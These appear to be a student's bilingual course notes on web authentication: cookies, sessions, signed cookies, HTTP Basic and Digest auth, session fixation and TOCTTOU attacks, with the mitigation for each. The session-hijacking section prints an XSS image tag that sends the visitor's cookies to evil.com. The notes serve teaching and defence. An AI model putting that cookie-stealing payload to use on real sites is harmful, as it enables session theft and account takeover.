---
article: false
date: 2025-04-06
index: true
order: 7
headerDepth: 1


---

# Authentication & Authorization

## Session Management

- Each request is independent of each other
- Sufficient for「足够的」 serving static content (.html, .css, .jpg, etc.)
- But the server cannot tell which requests come from the same user
- Why does state useful? 
  - for personalized services and user conveniences
  - e.g., any signed-in user experience
  - consider you need to enter your password again after each click

Solution: associate requests originated from the same user, i.e., maintaining a user session

or, tracking your cyber-whereabouts and breaking your privacy?

- i.e., a double-edged sword
- Third Party cookies

Note the privacy law, e.g., GDPR, EU Cookie Law (always ask for permission)

P.S. We are not talking about website fingerprinting here (fyi: amiunique.org).

## Cookies Communications

Making HTTP “Stateful” Using (HTTP/Web/Browser) Cookies

Cookies := a small ( ) client-side storage with its data replayed to where they were onfigured (cookie origin )

![1744013520557.png](https://pic.hanjiaming.com.cn/2025/04/07/f1cc55a2756be.png)

### Session Creation and Resumption using Cookies

- In the 1st visit, the browser makes a request to example.com w/ no **cookies**
- The server gives a Cookie value (w/ Set-Cookie **response** header)
- i.e., the web server told the browser to create a cookie for that "**origin**"
  (A cookie can also be created at the client-side)

### Session Maintenance using Cookies

- Cookie Values can store user preferences (e.g., theme=yellow)
- Setting a unique, random, and unpredictable "token" (a.k.a. session ID)
- The server can then isolate a user-specific session from other sessions
- Usage: Personalization, Authentication, and Session Storage (express-session)

## Cookie Parameters

![1744016410810.png](https://pic.hanjiaming.com.cn/2025/04/07/08e9efaa1fcb4.png)

Expires: specify the time when a cookie will be deleted automatically

- Seconds since the epoch time (00:00:00 UTC 1970-01-01)
- (Default) Setting it to 0 (zero) creates a session cookie， Browser will automatically clear a session cookie when shutdown
- Setting it to a past time tells the browser to remove the cookie ("immediately")
- or use res.clearCookie (name, [ options ]) with matching option

::: note Cookie SOP Examples

![Google Chrome 2025-04-07 17.36.50.png](https://pic.hanjiaming.com.cn/2025/04/07/64422c7508481.png)

1. **http://example.com or http://www.example.com**
   - **Cookie:** `user=niki`
   - Explanation: The domain `.example.com` matches `example.com` and `www.example.com`, and the path `/` matches any path, so `user=niki` is sent.

2. **http://secure.example.com or https://secure.example.com**
   - **Cookie:** `user=niki`
   - Explanation: The domain `.example.com` matches `secure.example.com`, and the path `/` matches any path, so `user=niki` is sent. The `user=ling` cookie is not sent because it is secure and the connection is not HTTPS.

3. **https://secure.example.com/accounts/index.html**
   - **Cookies:** `user=ling; user=niki`
   - Explanation: Both cookies match. The domain `secure.example.com` matches both cookies, the path `/accounts` matches the path of `user=ling`, and `/` matches the path of `user=niki`. Both cookies are sent, but the order is non-deterministic.

4. **https://secure.example.com/accounts/new/index.html**
   - **Cookies:** `user=ling; user=niki`
   - Explanation: Same reasoning as the previous URL. Both cookies match and are sent, but the order is non-deterministic.

According to RFC 6265, when multiple cookies with the same name are present, the order in which they are sent is not guaranteed. This can lead to non-deterministic behavior.

:::

## Problems of Using Cookies

### Privacy from a user perspective

- We know how a site can uniquely identify a user
- What are the resulted threats (and opportunities)?
- Should user be tracked across apps/webs? (how? by )

Integrity「正直」 and Authenticity「真实性」

- Cookies values reside on client-side
- That said, malicious users can tamper with the values
- Signed Cookies: HMAC for authenticity and integrity ("secret" in express/cookie-session)

Storage Size

- A cookie has at most 4KB per domain
- Recall the best practice: We want to keep the name/value size minimal to reduce bandwidth overhead

### Cookie Privacy

- 当访问C.com时，页面内嵌入的广告（来自ad.com）会向ad.com发送请求。
- 请求头中的`Referer`字段会携带当前页面URL（C.com），告知广告商用户正在访问的网站。
- ad.com通过响应头设置Cookie到用户浏览器，标记用户身份。
- 当用户访问另一个网站D.com（同样嵌入ad.com广告）时，浏览器会自动携带之前设置的Cookie，广告商即可关联两个网站的访问行为。

广告商通过不同网站（C.com、D.com）的Cookie和`Referer`信息，分析用户的浏览习惯、兴趣，最终实现精准广告投放。

Solution:

- 浏览器默认禁止跨域（第三方）网站在未经用户同意的情况下写入Cookie。例如，C.com页面中的ad.com iframe无法直接设置Cookie。
- 广告商的绕过方法
  - 使用重定向：诱导用户点击广告跳转到ad.com，使其成为“第一方”从而设置Cookie。
  - 利用浏览器漏洞或指纹识别技术（如设备指纹）替代Cookie跟踪。
- **启用反追踪策略**：
  - 完全屏蔽第三方Cookie（如Safari的智能防跟踪ITP）。
  - 发送`Do Not Track`请求头（需网站配合）。
  - 阻止已知跟踪域名的请求（如Firefox的增强型跟踪保护）。

But there are problems other than cookies...(Referer Header, link decorating)

### Cookie Integrity and Authenticity

Cookie values can be tampered

- Cookie is just another kind of "user" (e.g., attacker) inputs
- Apply server-side validations for cookies, e.g., use signedCookies
- For confidential values, (authenticated) is needed
- There are special middleware/APIs to do them
- Or you can implement by yourself (if you understand crypto)

Parameter Tampering Attack: Many old/naive shopping carts store "totalAmount" in cookies

## Other Client-side Session Storage

- HTML5 LocalStorage (5MB /origin)
- Unlike Cookies, does not replay in requests but accessible via JS API
- Useful to store specific service's offline content offline, e.g., Gmail
- Security: Follows the HTML5 SOP 
- Security: Client-side storage is still subject to tampering attacks
- There is also . (lives like session cookie; origin: domain+protocol)

## Why not both?

How about storing something both on the server and the client sides?

Worst of both worlds?

- Client storage could be adversarially manipulated
- Server still needs to maintain resource for each client

We need a cleverer way enjoy the best of both worlds

- Authenticated encryption of client-side storage!
- Server holds a short secret key for ALL clients, e.g., 256-bit for AES
- Without the key, client cannot produce meaningful ciphertexts produced by authenticated encryption
- Trades off computation against storage i/o overhead
- JSON Web Token (JWT): data with optional signature + encryption on JSON

::: info Cookies vs. localStorage vs. Session Mgt.

- **Cookies**: Client/server-readable, auto-sent with requests (4KB max). Used for auth (e.g., session IDs), support expiration. Secure with `HttpOnly`.
- **localStorage**: Client-only, persistent (5-10MB), no auto-transfer. Ideal for client-side data (e.g., preferences).
- **Session Management**: Typically server-side (session IDs in cookies) for user state. Alternatively, `sessionStorage` (client, tab-scoped, cleared on close).
  *Key differences*: Scope, persistence, size, and server interaction. Cookies handle auth; localStorage stores local data; sessions manage state securely.

:::

## Authentication vs. Authorization

Authentication: Is a user really whom he claims himself to be?

- something you know: password, private key
- something you have: CULink, one-time hardware token
- who you are: biometric features like fingerprints
- what you do: the way you shake/tap smartphone
- where you are: FB checks if country changed, IP, GPS
- or a combination of n of them (the so-called n-factor authentication or nFA) 

Authorization: Is an authenticated user allowed to do a task?

- Most common: Role-based access control
- e.g., is user A allowed to do task T1

## Credentials Database

Hash based Message Authentication Code (HMAC)

- HMAC is a keyed function to calculate a MAC (Prevent length-extension attack on MD hashes). [H(key || H(key || msg))]
- (don't use SHA1); pick memory-hard hash functions: Argon2, scrypt, bcrypt
- Use prepared statement. NEVER try to concatentate a SQL statement by yourself!
- Implement hmacPassword () function.

## Authentication Token & Authorization

Authenticate the token before admin operations

- The cookie value is "signed" with the provided secret
- A tampered value will mismatch with the "signature"
- Attacker cannot generate the corresponding "signature" without secret
- (Precisely, it is message authentication code, not signature)

Authorization check before admin operations

- Only upon a successful login
- req.session.username and req.session.admin are set according to DB

For subsequent requests,

- req.session.username accessible means logged-in user
- req.session.admin accessible means a logged-in admin user

::: tip Best Practice on Session Isolation

We often separate auth cookies from other session cookies -> connection sessionId (expires = 3 mths) and auth (expires: 180s)

Authentication Cookies

- auth should be configured with tighter security
- secure (i.e., https only)
- httpOnly (i.e., no JS access)
- path (restricted to a specific folder)
- Expire more often

General Session Cookies

- Associated with less critical data
- Some can be stored in localStorage at client side

:::

## Security Issues regarding Cookie Auth.

Session Hijacking: Stealing cookies with XSS attacks

```
<img src="404" onerror="this.src='//evil.com/'+escape(document.cookie)"/>
```

Attacker presents the stolen cookies to impersonate a victim

- Mitigation 1: Reduce the risk by making cookie expire sooner
- Mitigation 2: Set the flag HttpOnly for your cookies

Session Fixation: Forcing session id designed by attackers

- Cause: A vulnerable website let its user determine session id
- Some vulnerable systems allow user input as session id
- Attacker sends a URL with a custom PHPSESSID to a victim
- Victim visits the URL and login using the particular session
- Attacker visits the same URL and hijacks the session
- Mitigation: Change the session id upon login

```
攻击者生成一个特定的「PHPSSESSID」，例如“123456”。
攻击者构建一个带有自定义「PHPSSESSID」的URL，例如“http://example.com/login.php?PHPSESSID=123456”。
攻击者通过电子邮件或其他方式发送该URL给受害者。
受害者点击该URL并登录电子商务网站。
网站使用攻击者设置的「PHPSSESSID」创建「session」并保持受害者的登录状态。
攻击者访问同一个URL并劫持该「session」，从而能够访问受害者的账户。
```

## HTTP (Basic) Authentication

- The standardized and traditional way to authenticate a user
- Not favorable by commercial websites since it's not customizable
- Use this over HTTPs (sensitive data are not protected in HTTP)

![1744105328170.png](https://pic.hanjiaming.com.cn/2025/04/08/e2ac42aae7576.png)

- Realm: protection space (diff. page, same space).
- With Nginx: + apache2-util to create password file.
- With Node: Set headers, or use package express-basic-auth
- MDN: HTTP Authentication

## HTTP (Digest) Authentication

![1744105730206.png](https://pic.hanjiaming.com.cn/2025/04/08/c0d78315ef07e.png)

```
eg.

用户输入用户名和密码。
客户端发送初始请求，服务器返回401 Unauthorized状态码，并提供摘要认证参数（nonce、realm、opaque等）。
客户端使用用户名、密码、nonce、请求URI等参数计算HA1和HA2：
HA1 = MD5(username: realm: password)
HA2 = MD5(method: digestURI)
客户端使用HA1、nonce、nonceCount、clientNonce、qop和HA2计算response哈希值：
response = MD5(HA1: nonce: nonceCount: clientNonce: qop: HA2)
客户端发送带有认证信息的请求，包括用户名、realm、nonce、uri、response等参数。
服务器验证response哈希值，如果匹配，则允许访问资源。
```

## General Authentication Attacks

- Brute force Dictionary -> enumerating possible passwords
- Eavesdropping and Session Hijacking「窃听和会话劫持」
  - reading the password in plaintext protocol
  - replaying captured session token (or if it can be easily guessed)
- Shoulder surfing: looking over shoulders when entering password
- Phishing (Nowadays' threats) -> providing a fake webpage to lure genuine password
- Time-of-check to Time-of-use (TOCTTOU)
  - Race condition between the checking and actual usage.
  - e.g., taking over by unauthorized person after authentication (e.g., login)
- Others...(Broken Access Control makes authentication scheme useless)

::: info Enforce Proper Password Strength (incl. length, complexity) (check NIST 800-63)

TOCTTOU是一种竞态条件漏洞，发生在系统检查某个条件与实际使用资源之间的时间间隙。攻击者可能利用这个时间间隙进行恶意操作。例如，系统在检查用户权限后，攻击者在实际使用资源前改变了资源的状态，从而绕过权限检查。

eg. 

1. 用户提交转账请求，系统检查用户是否具有转账权限。
2. 权限检查通过后，系统准备执行转账操作。
3. 在执行转账操作前，攻击者修改转账请求的目标账户。
4. 系统执行转账操作，将资金转移到攻击者的账户。

:::

## Best Practices of Password Authentication













